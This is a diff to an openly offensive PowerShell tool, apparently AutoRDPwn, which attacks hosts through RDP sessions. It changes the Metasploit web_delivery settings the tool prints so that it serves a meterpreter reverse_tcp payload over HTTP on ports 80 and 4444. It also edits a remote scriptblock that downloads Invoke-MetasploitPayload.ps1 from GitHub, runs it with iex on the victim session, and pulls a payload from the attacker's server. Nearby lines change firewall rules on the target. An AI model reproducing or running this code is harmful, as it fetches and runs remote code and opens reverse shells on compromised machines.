@@ -392,9 +392,9 @@ if($Language -in 'Spanish') {
 	$metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
 	Write-host "$txt54" -NoNewLine -ForegroundColor Gray ; $metaserver = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
 	Write-Host ; Write-Host "$txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/script/web_delivery"
-	Write-host "set SRVHOST 0.0.0.0" ; Write-host "set SRVPORT 8443" ; Write-host "set SSL true" ; Write-host "set target 2"
-        Write-host "set payload windows/meterpreter/reverse_https" ; Write-host "set LHOST 0.0.0.0"
-	Write-host "set LPORT 443" ; Write-host "set URIPATH $metarandom" ; Write-host "run -j"
+	Write-host "set SRVHOST 0.0.0.0" ; Write-host "set SRVPORT 80" ; Write-host "set SSL false" ; Write-host "set target 2"
+        Write-host "set payload windows/meterpreter/reverse_tcp" ; Write-host "set LHOST 0.0.0.0"
+	Write-host "set LPORT 4444" ; Write-host "set URIPATH $metarandom" ; Write-host "run -j"
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
 
         if($shell -like 'X'){ $input = 'x' ; continue }
@@ -629,7 +629,7 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/mas
 if ($metasploit){ invoke-command -session $RDP[0] -scriptblock { Write-Host
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-MetasploitPayload.ps1" -UseBasicParsing | iex 
 Write-Host "==================== Metasploit Web Delivery =========================" -ForegroundColor Gray
-Invoke-MetasploitPayload -url https://$metaserver:8443/$metarandom -verbose
+Invoke-MetasploitPayload -url http://$metaserver/$metarandom -verbose ; sleep -milliseconds 7500
 Write-Host "======================================================================" -ForegroundColor Gray ; Write-Host }}
 
 if ($netcat -in 'local'){ invoke-command -session $RDP[0] -scriptblock { Write-Host ; netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
